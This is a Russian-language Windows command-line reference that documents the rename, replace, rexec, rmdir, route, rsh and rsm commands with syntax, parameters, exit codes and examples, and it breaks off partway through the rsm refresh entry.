Предположим, что в файл Config.nt требуется ввести поясняющий комментарий перед командой prompt. Для этого в файл Config.nt следует добавить следующие строки:

rem Установка приглашения для вывода текущего каталога
prompt $p$g
========================================================================================
Rename (ren)

Изменяет имя файла или набора файлов.
Синтаксис

rename [диск:][путь] имя_файла_1 имя_файла_2

ren [диск:][путь] имя_файла_1 имя_файла_2
Параметры

[диск:][путь] имя_файла1
    Задает местоположение и имя файла или набора файлов для переименования.
имя_файла_2
    Задает новое имя файла. Если используются подстановочные знаки (* и ?), то имя_файла_2 указывает новые имена для файлов. При переименовании файлов нельзя задать новый диск или путь.
/?
    Вывод справки в командной строке.

Примечания
- Переименование файлов

Допускается переименование всех файлов, соответствующих заданному имени файла. Команду rename нельзя использовать для переименования файлов на разных дисках или для их перемещения в другой каталог.
- Использование подстановочных знаков при переименовании

Подстановочные знаки (* и ?) могут быть использованы в параметрах, задающих имена. Если они использованы в параметре имя_файла_2, то символы, замещаемые символами подстановки, будут теми же, что и в параметре имя_файла_1.
- Команда переименования не будет работать, если имя_файла_2 уже существует.

Если имя файла, задаваемое параметром имя_файла_2, уже существует, команда rename выведет на экран следующее сообщение:

Дублирование имени файла или файл не найден
Примеры

Допустим, что необходимо изменить расширения имен всех файлов в текущем каталоге с расширением .txt; например, требуется заменить расширение .txt на .doc. Для выполнения этих изменений введите:

ren *.txt *.doc

Для переименования файла или каталога Chap10 в Part10 введите:

ren chap10 part10
========================================================================================
Replace

Заменяет файлы в одном каталоге файлами с теми же именами из другого каталога. Команда replace также может быть использована для добавления только тех файлов, которых еще нет в каталоге.
Синтаксис

replace [диск1:][путь1] имя_файла [диск2:][путь2] [/a] [/p] [/r] [/w]

replace [диск1:][путь1] имя_файла [диск2:][путь2] [/p] [/r] [/s] [/w] [/u]
Параметры

[диск1:][путь1] имя_файла
    Задает местонахождение и имя файла или набора исходных файлов.
[диск2:][путь2]
    Задает местонахождение файла-результата. Имена замещаемых файлов не могут быть заданы. Если ни диск, ни каталог не заданы, replace использует текущий диск и текущий каталог.
/a
    Добавляет, а не перезаписывает файлы в каталог-результат. Нельзя использовать данный параметр совместно с параметром /s или /u.
/p
    Добавляет или перезаписывает файлы с подтверждением.
/r
    Замещает файлы, предназначенные только для чтения, так же, как и обычные файлы. Если этот параметр не задан, а программа пытается заменить файл, предназначенный только для чтения, на экран будет выведено сообщение об ошибке и операция замены будет остановлена.
/w
    Перед началом поиска исходных файлов система будет ждать, пока пользователь вставит диск в дисковод. Если ключ /w не задан, замена или добавление фалов начнется сразу же после нажатия клавиши ENTER.
/s
    Ищет по всем подкаталогам каталога-назначения и заменяет файлы с подходящими именами. Нельзя использовать параметр /s совместно с параметром командной строки /a. Команда replace не ищет подкаталоги, указанные параметром путь1.
/u
    Заменяет (обновляет) только те файлы, которые имеют более раннюю дату модификации, чем файлы в исходном каталоге. Нельзя использовать параметр /u совместно с параметром командной строки /a.
/?
    Отображает справку в командной строке.

Примечания
- Сообщения команды replace

И при замене, и при добавлении файлов команда replace выводит их имена на экран. По окончании работы команда replace выводит на экран итоговую строку в одном из следующих форматов:

nnn файлов добавлено
nnn файлов заменено

ни один файл не добавлен
ни один файл не заменен
- Замена файлов на гибких дисках

Если используются гибкие диски и необходима их замена во время работы команды replace, требуется задать параметр командной строки /w и команда replace будет ожидать замены дисков в случае необходимости.
- Ограничения команды replace

Команда replace не может быть использована для обновления скрытых или системных файлов. Чтобы получить сведения о смене атрибутов скрытых и системных файлов, выберите attrib из списка в ссылке «».
- Коды завершения команды replace

В следующем списке приведены коды завершения команды с кратким описанием.
Код завершения     Описание
0     Файлы успешно заменены или добавлены командой replace
1     Команда replace обнаружила некорректную версию MS-DOS
2     Команда replace не может найти исходные файлы
3     Команда replace не может найти исходные файлы или файлы-результаты
5     Пользователь не имеет доступа к заменяемым файлам
8     Недостаточно системной памяти для работы команды
11     В строке вызова команды содержится синтаксическая ошибка

В пакетных программах можно использовать параметр уровень_ошибки команды if для анализа кода завершения команды replace. Чтобы посмотреть пример пакетной программы, обрабатывающей коды завершения, выберите if из списка в ссылке «».
Примеры

Предположим, что несколько каталогов на диске C содержат различные версии файла Phones.cli, который включает имена клиентов и их телефонные номера. Для замены всех этих файлов новейшей версией с диска в дисководе A служит следующая команда:

replace a:\phones.cli c:\ /s

Предположим, требуется добавить новый драйвер принтера в каталог Tools на диске C, в котором уже содержится несколько файлов драйверов принтеров для текстовых процессоров.

replace a:*.prd c:\tools /a

Эта команда просматривает текущий каталог диска A и находит все файлы с расширением .prd, а затем добавляет эти файлы в каталог Tools на диске C. Так как задан параметр /a, команда replace добавит только те файлы, которых еще нет на диске C.
========================================================================================
Rexec

Запускает команды на удаленных компьютерах с работающей службой Rexec. Команда rexec проверяет подлинность имени пользователя на удаленном компьютере до выполнения определенной команды. Операционные системы Windows XP и Windows 2000 не предоставляют возможности службы Rexec. Запущенная без параметров команда rexec выводит справку.
Синтаксис

rexec [узел] [-l имя_пользователя] [-n] [команда]
Параметры

узел
    Указывает имя или IP-адрес удаленного узла (компьютера), на котором необходимо выполнить команду.
-l имя_пользователя
    Задает имя пользователя, которое будет использовано на удаленном компьютере. Если этот параметр опущен, используется имя текущего пользователя, вошедшего в систему.
-n
    Перенаправляет ввод команды rexec с устройства NUL. Это предотвращает отображение результатов команды на локальном компьютере.
команда
    Задает команду, которая будет запущена на удаленном компьютере.
/?
    Отображает справку в командной строке.

Примечания
- Стандартные операции

Команда rexec запрашивает пароль пользователя и проверяет его на удаленном компьютере. Заданная команда будет выполняться после подтверждения подлинности пароля.

Команда rexec копирует стандартный ввод в удаленную команду, стандартный вывод удаленной команды в свой стандартный поток вывода и стандартные ошибки удаленной команды в свой стандартный поток сообщений об ошибках. Команда rexec обычно завершает работу после окончания работы удаленной команды.
- Использование символов перенаправления

Для выполнения перенаправления на удаленном компьютере следует заключать символы перенаправления в кавычки (например, ">>"). При отсутствии кавычек перенаправление выполняется на локальном компьютере. Например, следующая команда будет добавлять удаленный файл уд_файл к локальному файлу лок_файл:

rexec уд_компьютер cat уд_файл >> лок_файл

Следующая команда будет добавлять удаленный файл уд_файл1 к файлу уд_файл2 на удаленном компьютере:

rexec уд_компьютер cat уд_файл1">>" уд_файл2
- Интерактивные команды

Большинство интерактивных команд не могут быть запущены командой rexec. Например, командой rexec не могут быть запущены программы vi или emacs. Однако, имеется возможность использовать команды telnet.
- Эта команда доступна, только если в свойствах сетевого адаптера в объекте Сетевые подключения в качестве компонента установлен протокол Интернета (TCP/IP).
Примеры

Чтобы выполнить команду telcon на удаленном компьютере «vax1», используя имя «admin1», введите следующую команду:

rexec vax1 -l admin1 telcon
========================================================================================
Rmdir (rd)

Удаляет каталог.
Синтаксис

rmdir [диск:]путь [/s] [/q]

rd [диск:]путь [/s] [/q]
Параметры

[диск:]путь
    Задает диск и местоположение каталога для удаления.
/s
    Удаляет указанный каталог и все подкаталоги вместе с файлами. Параметр /s используется для удаления дерева каталогов.
/q
    Запускает rmdir в скрытом режиме. Команда удаляет каталоги без запроса подтверждения.
/?
    Отображает справку в командной строке.

Примечания
- Использование команды rmdir в консоли восстановления

Команда rmdir с другими параметрами доступна в консоли восстановления.
- Удаление каталогов со скрытыми и системными файлами

Удаление каталогов со скрытыми и системными файлами невозможно. При попытке удаления, появится следующее сообщение:

Каталог не является пустым.

Для получения списка скрытых и системных файлов следует использовать команду dir, а для просмотра и смены атрибутов — команду attrib. Для получения дополнительных сведений щелкните ссылку «».
- Использование обратной косой черты

Если перед первым именем каталога вставлена обратная косая черта (\), этот каталог будет рассматриваться как подкаталог корневого каталога независимо от имени текущего каталога. Если обратной косой черты нет, каталог будет рассматриваться как подкаталог текущего каталога.
- Удаление текущего каталога

Команда rmdir не может быть использована для удаления текущего каталога. Вначале необходимо перейти в другой каталог (который не является подкаталогом текущего) и затем использовать команду rmdir. При попытке удалить текущий каталог появляется следующее сообщение:

Нет доступа к файлу, так как он используется другим процессом.
Примеры

Для удаления каталога \User\Smith вначале необходимо удостовериться в том, что он не содержит файлов. Для этого наберите в командной строке:

dir \user\smith /a

На экране должны быть выведены только символы «.» и «..».

Затем из любого каталога, кроме \User\Smith, запустите следующую команду:

rmdir \user\smith

Для удаления каталога \User, всех файлов и всех подкаталогов используйте следующую команду:

rmdir /s \user
========================================================================================
Route

Выводит на экран и изменяет записи в локальной таблице IP-маршрутизации. Запущенная без параметров, команда route выводит справку.
Синтаксис

route [-f] [-p] [команда [конечная_точка] [mask маска_сети] [шлюз] [metric метрика]] [if интерфейс]]
Параметры

-f
    Очищает таблицу маршрутизации от всех записей, которые не являются узловыми маршрутами (маршруты с маской подсети 255.255.255.255), сетевым маршрутом замыкания на себя (маршруты с конечной точкой 127.0.0.0 и маской подсети 255.0.0.0) или маршрутом многоадресной рассылки (маршруты с конечной точкой 224.0.0.0 и маской подсети 240.0.0.0). При использовании данного параметра совместно с одной из команд (таких, как add, change или delete) таблица очищается перед выполнением команды.
-p
    При использовании данного параметра с командой add указанный маршрут добавляется в реестр и используется для инициализации таблицы IP-маршрутизации каждый раз при запуске протокола TCP/IP. По умолчанию добавленные маршруты не сохраняются при запуске протокола TCP/IP. При использовании параметра с командой print выводит на экран список постоянных маршрутов. Все другие команды игнорируют этот параметр. Постоянные маршруты хранятся в реестре по адресу HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\PersistentRoutes
команда
    Указывает команду, которая будет запущена на удаленной системе. В следующей таблице представлен список допустимых параметров.
    Команда     Назначение
    add     Добавление маршрута
    change     Изменение существующего маршрута
    delete     Удаление маршрута или маршрутов
    print     Печать маршрута или маршрутов
конечная_точка
    Определяет конечную точку маршрута. Конечной точкой может быть сетевой IP-адрес (где разряды узла в сетевом адресе имеют значение 0), IP-адрес маршрута к узлу, или значение 0.0.0.0 для маршрута по умолчанию.
mask маска_сети
    Указывает маску сети (также известной как маска подсети) в соответствии с точкой назначения. Маска сети может быть маской подсети соответствующей сетевому IP-адресу, например 255.255.255.255 для маршрута к узлу или 0.0.0.0. для маршрута по умолчанию. Если данный параметр пропущен, используется маска подсети 255.255.255.255. Конечная точка не может быть более точной, чем соответствующая маска подсети. Другими словами, значение разряда 1 в адресе конечной точки невозможно, если значение соответствующего разряда в маске подсети равно 0.
шлюз
    Указывает IP-адрес пересылки или следующего перехода, по которому доступен набор адресов, определенный конечной точкой и маской подсети. Для локально подключенных маршрутов подсети, адрес шлюза — это IP-адрес, назначенный интерфейсу, который подключен к подсети. Для удаленных маршрутов, которые доступны через один или несколько маршрутизаторов, адрес шлюза — непосредственно доступный IP-адрес ближайшего маршрутизатора.
metric метрика
    Задает целочисленную метрику стоимости маршрута (в пределах от 1 до 9999) для маршрута, которая используется при выборе в таблице маршрутизации одного из нескольких маршрутов, наиболее близко соответствующего адресу назначения пересылаемого пакета. Выбирается маршрут с наименьшей метрикой. Метрика отражает количество переходов, скорость прохождения пути, надежность пути, пропускную способность пути и средства администрирования.
if интерфейс
    Указывает индекс интерфейса, через который доступна точка назначения. Для вывода списка интерфейсов и их соответствующих индексов используйте команду route print. Значения индексов интерфейсов могут быть как десятичные, так и шестнадцатеричные. Перед шестнадцатеричными номерами вводится 0х. В случае, когда параметр if пропущен, интерфейс определяется из адреса шлюза.
/?
    Отображает справку в командной строке.

Примечания
- Большие значения в столбце metric таблицы маршрутизации — результат возможности протокола TCP/IP автоматически определять метрики маршрутов таблицы маршрутизации на основании конфигурации IP-адреса, маски подсети и стандартного шлюза для каждого интерфейса ЛВС. Автоматическое определение метрики интерфейса, включенное по умолчанию, устанавливает скорость каждого интерфейса и метрики маршрутов для каждого интерфейса так, что самый быстрый интерфейс создает маршруты с наименьшей метрикой. Чтобы удалить большие метрики, отключите автоматическое определение метрики интерфейса в дополнительных свойствах протокола TCP/IP для каждого подключения по локальной сети. - Имена могут использоваться для параметра конечная_точка, если существует соответствующая запись в файле базы данных Networks, находящемся в папке системный_корневой_каталог\System32\Drivers\Etc. В параметре шлюз можно указывать имена до тех пор, пока они разрешаются в IP-адреса с помощью стандартных способов разрешения узлов, таких как запрос службы DNS, использование локального файла Hosts, находящегося в папке системный_корневой_каталог\system32\drivers\etc, или разрешение имен NetBIOS. - Если команда — print или delete, параметр шлюз опускается и используются подстановочные знаки для указания точки назначения и шлюза. Значение конечной_точки может быть подстановочным значением, которое указывается звездочкой (*). При наличии звездочки (*) или вопросительного знака (?) в описании конечной точки, они рассматриваются как подстановки, тогда печатаются или удаляются только маршруты, соответствующие точке назначения. Звездочка соответствует любой последовательности символов, а вопросительный знак — любому одному символу. 10.*.1, 192.168.*, 127.* и *224* являются допустимыми примерами использования звездочки в качестве подстановочного символа. - При использовании недопустимой комбинации значений конечной точки и маски подсети (маски сети) выводится следующее сообщение об ошибке : «Маршрут: неверная маска подсети адреса шлюза». Ошибка появляется, когда одно или несколько значений разрядов в адресе конечной точки равно 1, а значения соответствующих разрядов маски подсети — 1. Для проверки этого состояния выразите конечную точку и маску подсети в двоичном формате. Маска подсети в двоичном формате состоит из последовательности единичных битов, представляющей часть сетевого адреса конечной точки, и последовательности нулевых битов, обозначающей часть адреса узла конечной точки. Проверьте наличие единичных битов в части адреса точки назначения, которая является адресом узла (как определено маской подсети). - Параметр -p поддерживается в команде route только в операционных системах Windows NT 4.0, Windows 2000, Windows Millennium Edition и Windows XP. Этот параметр не поддерживается командой route в системах Windows 95 и Windows 98. - Эта команда доступна, только если в свойствах сетевого адаптера в объекте Сетевые подключения в качестве компонента установлен протокол Интернета (TCP/IP).
Примеры

Чтобы вывести на экран все содержимое таблицы IP-маршрутизации, введите команду:

route print

Чтобы вывести на экран маршруты из таблицы IP-маршрутизации, которые начинаются с 10., введите команду:

route print 10.*

Чтобы добавить маршрут по умолчанию с адресом стандартного шлюза 192.168.12.1, введите команду:

route add 0.0.0.0 mask 0.0.0.0 192.168.12.1

Чтобы добавить маршрут к конечной точке 10.41.0.0 с маской подсети 255.255.0.0 и следующим адресом перехода 10.27.0.1, введите команду:

route add 10.41.0.0 mask 255.255.0.0 10.27.0.1

Чтобы добавить постоянный маршрут к конечной точке 10.41.0.0 с маской подсети 255.255.0.0 и следующим адресом перехода 10.27.0.1, введите команду:

route -p add 10.41.0.0 mask 255.255.0.0 10.27.0.1

Чтобы добавить маршрут к конечной точке 10.41.0.0 с маской подсети 255.255.0.0 и следующим адресом перехода 10.27.0.1 и метрикой стоимости 7, введите команду:

route add 10.41.0.0 mask 255.255.0.0 10.27.0.1 metric 7

Чтобы добавить маршрут к конечной точке 10.41.0.0 с маской подсети 255.255.0.0 и следующим адресом перехода 10.27.0.1 и использованием индекса интерфейса 0х3, введите команду:

route add 10.41.0.0 mask 255.255.0.0 10.27.0.1 if 0x3

Чтобы удалить маршрут к конечной точке 10.41.0.0 с маской подсети 255.255.0.0, введите команду:

route delete 10.41.0.0 mask 255.255.0.0

Чтобы удалить все маршруты из таблицы IP-маршрутизации, которые начинаются с 10., введите команду:

route delete 10.*

Чтобы изменить следующий адрес перехода для маршрута с конечной точкой 10.41.0.0 и маской подсети 255.255.0.0 с 10.27.0.1 на 10.27.0.25, введите команду:

route change 10.41.0.0 mask 255.255.0.0 10.27.0.25
========================================================================================
Rsh

Выполняет команды на удаленном компьютере, на котором запущена служба RSH или демон. Windows XP и Windows 2000 не поддерживают службу RSH. Службу RSH с именем Rshsvc.exe предоставляет пакет «Windows 2000 Server Resource Kit». Used without parameters, rsh displays help.
Синтаксис

rsh [узел] [-l имя_пользователя] [-n] [команда]
Параметры

узел
    Задает удаленный узел (компьютер), на котором запускается команда.
-l имя_пользователя
    Задает имя пользователя, используемое при подключении к удаленной системе. Если этот параметр опущен, используется имя текущего пользователя, вошедшего в систему.
-n
    Перенаправляет ввод команды rsh с устройства NUL. Это предотвращает отображение результатов команды на локальном компьютере.
команда
    Указывает команду, которая будет запущена на удаленной системе.
/?
    Отображает справку в командной строке.

Примечания
- Стандартные операции

Команда rsh копирует стандартный ввод в удаленную команду, стандартный вывод удаленной команды в свой стандартный поток вывода и стандартные ошибки удаленной команды в свой стандартный поток сообщений об ошибках. Команда Rsh обычно заканчивает работу после окончания работы удаленной команды.
- Использование символов перенаправления

Заключайте символы перенаправления в кавычки для выполнения перенаправления на удаленном компьютере (например, ">>"). При отсутствии кавычек перенаправление выполняется на локальном компьютере. Например, следующая команда будет добавлять удаленный файл уд_файл к локальному файлу лок_файл:

rsh уд_компьютер cat уд_файл >> лок_файл

Следующая команда будет добавлять удаленный файл уд_файл1 к файлу уд_файл2 на удаленном компьютере:

rsh уд_компьютер cat уд_файл1">>" уд_файл2
- Использование команды rsh

При использовании компьютера, который находится под управлением Windows XP Professional и входит в домен, должен быть доступен основной контроллер домена для проверки имени пользователя, в противном случае, команда rsh не выполняется.
- Файл .rhosts

Файл .rhosts обычно управляет правами сетевого доступа к UNIX системам. В этом файле перечислены имена компьютеров и соответствующие имена пользователей, которые имеют доступ к удаленным компьютерам. При обращении к удаленной системе с правильно настроенным файлом .rhosts с помощью команд rcp, rexec и rsh ввод имени пользователя и пароля не требуется.

Файл .rhosts является текстовым файлом, в котором каждая строка является записью. Запись состоит из локального имени компьютера, локального имени пользователя и произвольного комментария. Каждое поле отделяется символом табуляции или пробелом, комментарий начинается со знака (#), например: Например:

узел7 #Этот компьютер находится в комнате 31A

Файл .rhosts должен находиться в основном каталоге пользователя на удаленном компьютере. Дополнительные сведения о специфической реализации файла .rhosts на удаленном компьютере см. в документации удаленного компьютера.
- Эта команда доступна, только если в свойствах сетевого адаптера в объекте Сетевые подключения в качестве компонента установлен протокол Интернета (TCP/IP).
Примеры

Чтобы выполнить команду telcon на удаленном компьютере «vax1», используя имя «admin1», введите следующую команду:

rsh vax1 -l admin1 telcon
Рисунок Microsoft Windows
Rsm

Управляет ресурсами носителей с помощью службы «Съемные ЗУ». Используя команду rsm можно запускать пакетные сценарии для приложений, которые не поддерживает интерфейс API системы съемных носителей.

Чтобы выделить носитель из пула носителей
Синтаксис

rsm allocate /mимя_пула_носителей /o{errunavail|new|next} {/l{g|f}код_логического_носителя | /p{g|f}код_раздела} [/lnимя_логического_носителя] [/ldописание_логического_носителя] [/pnимя_раздела] [/pdописание_раздела] [/tвремя_ожидания] [/b]
Параметры

/mимя_пула_носителей
    Носитель выбирается из указанного пула носителей. Это значит, что для работы будет использоваться выделенный носитель из этого пула.
/o
    Разрешает использование одного из параметров, выведенных в следующей таблице.
    Значение     Описание
    errunavail     Предотвращает создание запроса оператора на новый носитель, если выделение носителя по заданным ограничениям невозможно
    new     Выделяет раздел, который не может быть использован вместе с другим приложением. Так можно резервировать вторую сторону двустороннего носителя
    next     Выделяет следующую сторону носителя, выделенного ранее с помощью аргумента new
/l{g|f}код_логического_носителя
    Указывает носитель для выделения с помощью кода логического носителя. Используйте код GUID (с параметром lg) или понятное имя (с параметромIf). Параметр код_логического_носителя задает следующую выделяемую сторону неодностороннего носителя. Этот параметр необязателен и используется только с параметрами /o и next. После освобождения этого носителя его код не будет определен.
/p{g|f}код_раздела
    Указывает раздел для выделения с помощью кода раздела. Используйте код GUID (с параметром lg) или понятное имя (с параметромIf). Этот параметр необязателен и остается определенным даже после освобождения носителя.
/lnимя_логического_носителя
    Задает носитель для выделения, используя имя логического носителя.
/ldописание_логического_носителя
    Задает носитель для выделения, используя описание логического носителя.
/pnимя_раздела
    Определяет раздел для выделения, используя имя раздела.
/pdописание_раздела
    Указывает раздел носителя для выделения, используя описание раздела.
/tвремя_ожидания
    Задает время ожидания в миллисекундах. Время ожидания по умолчанию не ограничено.
/b
    Отображается только код GUID для операции выделения. Это сделано для того, чтобы результат одной команды можно было наиболее просто передать следующей команде.
/?
    Отображает справку в командной строке.

Примечания
- В других командах параметры /lf и /pf позволяют задать в качестве параметра имя логического носителя или его стороны соответственно. Если в данной команде не используются имена носителей (понятные имена), в следующих командах для указания логического носителя можно будет использовать только коды GUID.

Чтобы создать пул носителей
Синтаксис

rsm createpool /mимя_пула_носителей /a{existing|always|new} [/t{g|f}код_типа_носителей_в_пуле] [/d] [/r]
Параметры

/mимя_пула_носителей
    Задает имя создаваемого пула.
/a
    Разрешает использование одного из параметров, выведенных в следующей таблице.
    Значение     Описание
    existing     Открывает существующий пул носителей или возвращает ошибку, если указанный пул носителей не существует
    always     Открывает имеющийся пул носителей или создает новый пул носителей, если указанный пул не найден
    new     Создает новый пул носителей или возвращает ошибку, если указанный пул носителей уже существует.
/tgкод_типа_носителей_в_пуле
    Указывает тип носителей, находящихся в пуле, используя код GUID. По умолчанию используется тип носителей родительского пула.
/tgкод_типа_носителей_в_пуле
    Указывает тип носителей, находящихся в пуле, используя понятное имя. По умолчанию используется тип носителей родительского пула.
/d
    Разрешает пулу носителей автоматически извлекать носители из пула свободных носителей. Если ключ /d не включен в команду, данному пулу не разрешено выделять носители из пула свободных носителей.
/r
    Разрешает пулу носителей автоматически возвращать носители в пул свободных носителей. Если ключ /r не включен в команду, данному пулу не разрешено возвращать носители в пул свободных носителей.
/?
    Отображает справку в командной строке.

Чтобы освободить носитель
Синтаксис

rsm deallocate /l{g|f}код_логического_носителя | /p{g|f}код_раздела
Параметры

/lgкод_логического_носителя
    Указывает логический носитель для освобождения, используя код GUID.
/lfкод_логического_носителя
    Определяет логический носитель для освобождения, используя понятное имя.
/pgкод_раздела
    Задает сторону носителя для освобождения, используя код GUID. 
/pfкод_раздела
    Указывает сторону носителя для освобождения, используя понятное имя.
/?
    Отображает справку в командной строке.

Примечания
-Для задания освобождаемого логического носителя может использоваться имя логического носителя или имя его стороны (раздела), только если одно из этих имен было задано в команде allocate (параметры /ln и /pn соответственно). В противном случае необходимо задать код логического носителя (LMID) или код раздела (PARTID).

Чтобы удалить пул носителей
Синтаксис

rsm deletepool /mимя_пула_носителей
Параметры

/mимя_пула_носителей
    Задает имя удаляемого пула.
/?
    Отображает справку в командной строке.

Чтобы отсоединить носитель от диска
Синтаксис

rsm dismount {/l{g|f}код_логического_носителя | /p{g|f}код_раздела
rsm dismount [/o[deferred]]}
Параметры

/lgкод_логического_носителя
    Указывает логический носитель для отсоединения, используя код GUID.
/lfкод_логического_носителя
    Определяет логический носитель для отсоединения, используя понятное имя.
/pgкод_раздела
    Задает сторону носителя для отсоединения, используя код GUID.
/pfкод_раздела
    Указывает сторону носителя для отсоединения, используя понятное имя.
/o
    При совместном использовании с дополнительным параметром deferred, данный необязательный ключ отмечает носитель как отсоединяемый, но носитель остается в устройстве. Последующие команды присоединения будут выполняться, как обычно. Если этот параметр не используется, носитель будет отсоединен от устройства.
/?
    Отображает справку в командной строке.

Примечания
-Для задания отсоединяемого логического носителя может использоваться имя логического носителя или имя его стороны (раздела), только если одно из этих имен было задано в команде allocate (параметры /ln и /pn соответственно). В противном случае необходимо задать код логического носителя (LMID) или код раздела (PARTID).

Чтобы извлечь носитель из библиотеки

Носитель для извлечения можно задать одним из трех способов.
-Указать физический носитель, который требуется извлечь, используя код физического носителя (PMID) или имя физического носителя. - Извлечь носитель из определенного отсека в библиотеке. - Извлечь носитель c определенного устройства в библиотеке.
Синтаксис

rsm eject {/p{g|f}код_физического_носителя | /s{g|f}код_отсека /l{g|f}код_библиотеки | /d{g|f}код_устройства /l{g|f}код_библиотеки
rsm eject [/oкод_операции_извлечения]
rsm eject [/a{start|stop|queue}]
rsm eject [/b]
Параметры

/pgкод_физического_носителя
    Указывает физический носитель для извлечения, используя код GUID.
/pfкод_физического_носителя
    Определяет физический носитель для извлечения, используя понятное имя.
/sgкод_отсека
    Задает отсек, содержащий носитель для извлечения, используя код GUID.
/sfкод_отсека
    Указывает отсек, содержащий носитель для извлечения, используя понятное имя.
/lgкод_библиотеки
    С помощью кода GUID определяет библиотеку, содержащую отсек или устройство, из которого требуется извлечь носитель.
/lfкод_библиотеки
    С помощью понятного имени указывает библиотеку, содержащую отсек или устройство, из которого требуется извлечь носитель.
/dgкод_устройства
    Задает устройство, содержащее носитель для извлечения, используя код GUID.
/dfкод_устройства
    Указывает устройство, содержащее носитель для извлечения, используя понятное имя.
/oкод_операции_извлечения
    Используется, чтобы задать код GUID для конкретной операции извлечения. Для прерывания выполнения определенной операции извлечения вместе с параметром /a и аргументом stop можно использовать необязательный параметр /o. Он также служит для отображения кода GUID определенной операции извлечения совместно с параметром /a и аргументом start.
/a
    Разрешает использование одного из параметров, выведенных в следующей таблице.
    Значение     Описание
    Start     По умолчанию, запускает операцию извлечения немедленно. Носитель будет извлечен до истечения времени ожидания либо пока не будет выполнена другая команда «eject» с параметром командной строки /a и параметром stop. В таких командах извлечения с помощью параметра командной строки /o также должен быть задан код GUID операции. Время ожидания задается в объекте библиотеки (для всех операций извлечения) для данной библиотеки. Этот параметр задается через интерфейс API системы съемных носителей. Также может использоваться совместно с параметром /o для отображения кода GUID определенной операции извлечения
    Stop     Прекращает выполнение операции извлечения до истечения времени ожидания. Определенную операцию извлечения можно прервать, используя код GUID, отображаемый при использовании параметра start с ключами /a и /o
    Queue     Поставляет носитель в очередь на извлечение. Этот аргумент используется при работе с библиотеками, имеющими порты вставки/извлечения для нескольких отсеков
/b
    Отображает только код GUID операции извлечения для использования в сценариях.
/?
    Отображает справку в командной строке.

Чтобы извлечь носитель из сменщика ATAPI
Синтаксис

rsm ejectatapi /nномер_сменщика_ATAPI
Параметры

/nномер_сменщика_ATAPI
    Задает номер сменщика. номер_сменщика_ATAPI — число в конце строки имени устройства сменщика. Например, номер сменщика ATAPI «\\.\CdChanger0» — 0.
/?
    Отображает справку в командной строке.

Примечания
- До выполнения данной команды вручную остановите службу ntmssvc.

Чтобы произвести учет носителей в определенной автоматической библиотеке
Синтаксис

rsm inventory /l{g|f}код_библиотеки /a{full|fast|default|none|stop}
Параметры

/lfкод_библиотеки
    Указывает библиотеку, в которой необходимо произвести учет, используя понятное имя.
/lgкод_библиотеки
    Указывает библиотеку, в которой необходимо произвести учет, используя код GUID.
/a
    Обязательный параметр. Определяет тип операции учета, которую надо выполнить. В следующей таблице представлен список допустимых операций учета.
    Значение     Описание
    Full     Выполняет полный учет носителей в библиотеке. Система съемных носителей присоединяет каждую ленту или диск библиотеки и читает коды носителя.
    Fast     Осуществляет учет штрих-кодов, если в библиотеке установлен считыватель штрих-кода. Если в библиотеке нет считывателя штрих-кода, система съемных носителей проверяет отсек и производит чтение кода носителя, подключенного к отсеку, который раньше был пустым.
    Default     Выполняет учет, использую метод по умолчанию, указанный в диалоговом окне библиотеки Свойства
    None     Учет не производится
    Stop     Останавливает текущий учет для конкретной библиотеки, если он выполняется
/?
    Отображает справку в командной строке.

Чтобы присоединить носитель к указанной библиотеке

Присоединяемый логический носитель должен быть задан кодом логического носителя (LMID) или именем логического носителя.
Синтаксис

rsm mount {/l{g|f}код_логического_носителя | /p{g|f}код_раздела | [/s{g|f}код_отсека /c{g|f}код сменщика}
rsm mount [/d{g|f}код_устройства]
rsm mount /o{errunavail|drive|read|write|offline}
rsm mount [/r{normal|high|low|highest|lowest}]
rsm mount [/tвремя_ожидания]
Параметры

/lfкод_логического_носителя
    Определяет логический носитель для присоединения, используя понятное имя.
/pfкод_раздела
    Указывает сторону носителя для присоединения, используя понятное имя.
/pgкод_раздела
    Задает сторону носителя для присоединения, используя код GUID.
/lgкод_логического_носителя
    Определяет логический носитель для присоединения, используя код GUID.
/cgкод_сменщика
    Задает сменщика, в котором содержится носитель для присоединения, используя код GUID. Этот аргумент можно задать только совместно с параметром /sg и кодом GUID отсека.
/cfкод_сменщика
    Указывает сменщика, в котором содержится носитель для присоединения, используя понятное имя. Этот аргумент можно задать только совместно с параметром /sg и кодом GUID отсека.
/sgкод_отсека
    Задает отсек носителей, в котором содержится носитель для присоединения, используя код GUID. Этот аргумент можно задать только совместно с параметром /cg и кодом GUID сменщика.
/sfкод_отсека
    Определяет отсек носителей, в котором содержится носитель для присоединения, используя понятное имя. Этот аргумент можно задать только совместно с параметром /cg и кодом GUID сменщика.
/dgкод_устройства
    Указывает определенное устройство, на котором требуется выполнить присоединение носителя, используя код GUID. Этот параметр необязателен и используется только с ключом /o и параметром drive.
/dfкод_устройства
    Задает определенное устройство, на котором требуется выполнить присоединение носителя, используя понятное имя. Этот параметр необязателен и используется только с ключом /o и параметром drive.
/o
    Разрешает использование одного из параметров. указанных в следующей таблице.
    Значение     Описание
    Errunavail     Выдает ошибку, если носитель или устройство недоступны
    Drive     Задает определенное устройство, на котором выполняется присоединение. Этот аргумент используется совместно с ключом /d
    Read     Присоединяет носитель для чтения
    Write     Присоединяет носитель для чтения. Если используется этот аргумент, носитель, работа с которым завершена, не будет присоединен.
    Offline     Выдает ошибку, если носитель не подключен
/r
    В необязательном порядке определяет порядок присоединения (или приоритет). Приоритет для присоединения можно также указать с помощью одного из параметров: normal (по умолчанию), high, low, highest и lowest.
/t
    В необязательном порядке задает время ожидания для команды в миллисекундах. Время ожидания по умолчанию «бесконечно».
/?
    Отображает справку в командной строке.

Примечания
- При использовании команды mount можно задать присоединяемый носитель с помощью параметра /l, параметра /p или сочетания параметров /s и /c.

Чтобы обновить библиотеку, физический носитель или все устройства с определенным типом носителя

Эта команда опрашивает указанные устройства для занесения их текущего состояния в базу данных съемных носителей. Эта команда обычно используется после извлечения и вставки носителей.
Синтаксис

rsm refresh {/l{g|f]код_библиотеки | /p{g|f}код_физического_носителя | /tgкод_типа_носителя}
Параметры

/lgкод_библиотеки
    Задает библиотеку для обновления, используя код GUID.
/lfкод_библиотеки
    Определяет библиотеку для обновления, используя понятное имя.
/pgкод_физического_носителя
    Указывает физический носитель для обновления, используя код GUID.
/pfкод_физического_носителя
    Указывает физический носитель для обновления, используя понятное имя.
/tgкод_типа_носителя
